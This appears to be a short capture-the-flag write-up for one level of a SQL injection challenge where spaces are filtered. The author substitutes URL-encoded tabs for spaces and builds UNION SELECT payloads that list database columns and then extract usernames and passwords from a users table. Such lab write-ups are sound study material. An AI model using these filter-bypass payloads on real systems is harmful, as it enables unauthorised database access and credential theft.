Well now the challenge is disallowing space characters...

This is becoming more and more simple
SQL doesn't care about spaces, it also accepts \t and \n
So let's just look up the URL encoding table for the value of \t
And use it as a whitespace

?q='%09OR''%3D'
Works just fine, let's check the union again
?q='UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'
Returns full results

?q=a'UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'a
Returns no results

Meaning it works like a charm, let's proceed

a'UNION SELECT column_name AS title, table_name AS link, data_type AS description FROM INFORMATION_SCHEMA.COLUMNS UNION SELECT * FROM search_engine WHERE ''='a
Becomes
a'UNION%09SELECT%09column_name%09AS%09title,%09table_name%09AS%09link,%09data_type%09AS%09description%09FROM%09INFORMATION_SCHEMA.COLUMNS%09UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'a

Same layout as previous two levels, let's just
a'UNION%09SELECT%09username%09AS%09title,%09password%09AS%09link,%09password%09AS%09description%09FROM%09users%09UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'a
